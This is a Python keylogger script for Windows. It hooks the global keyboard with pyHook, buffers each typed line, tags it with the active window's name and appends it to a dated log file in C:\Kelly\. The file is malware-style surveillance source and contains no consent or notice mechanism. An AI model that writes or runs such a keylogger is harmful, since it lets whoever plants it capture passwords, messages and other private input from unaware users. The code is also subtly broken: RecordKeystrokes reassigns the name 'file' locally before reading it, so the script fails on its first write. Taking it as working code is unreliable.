import pyHook, pythoncom, sys, logging
from datetime import datetime
#get the date with format yyyy-month-dd
today = datetime.now().strftime('%Y-%b-%d')
#create log file in Disk C/ Kelly Folder/ yyyy-month-dd.txt
file = 'C:\\Kelly\\' + today + '.txt'
inputs = "" 
applications = "" #current application the the user is typing in
#open file in append mode, write input on file and close the file
def RecordKeystrokes(line):
    file = open(file, 'a') 
    file.write(line) 
    file.close() 

def OnKeyboardEvent(event):
    global inputs
    global applications

    # if user switchs to a new window and the record is not empty, add a new line input to file   
    if(applications != event.WindowName): 
        if(inputs != ""): 
            inputs += '\n'
            RecordKeystrokes(inputs)
        inputs = "" #in case there's nothing in the input record, simply record the input and write it to file along with the window name
        RecordKeystrokes('\nApplication: ' + event.WindowName + '\n') 
        applications = event.WindowName #set the new window name

    #print a whole sentence on seperate line instead of 1 character per line
    if(event.Ascii == 13 or event.Ascii == 9): #9: Tab key, 13: carriage return key
        inputs += '\n'
        RecordKeystrokes(inputs) 
        inputs = "" 
        return True 

    """if backspace key pressed"""
    if(event.Ascii == 8): #8:backspace key
        inputs = inputs[:-1] #remove last character
        return True 

    """if non-normal ascii character"""
    if(event.Ascii < 32 or event.Ascii > 126):
        if(event.Ascii == 0): #ignore non-character input ( shift, ctrl, alt, fn, tab...)
            pass 
        else:
            inputs = inputs + '\n' + str(event.Ascii) + '\n'
    else:
        inputs += chr(event.Ascii) #add pressed character to line buffer
        
    return True 

hooks_manager = pyHook.HookManager() #create hook manager
hooks_manager.KeyDown = OnKeyboardEvent #watch for key press
hooks_manager.HookKeyboard() #set the hook
pythoncom.PumpMessages() #wait for events
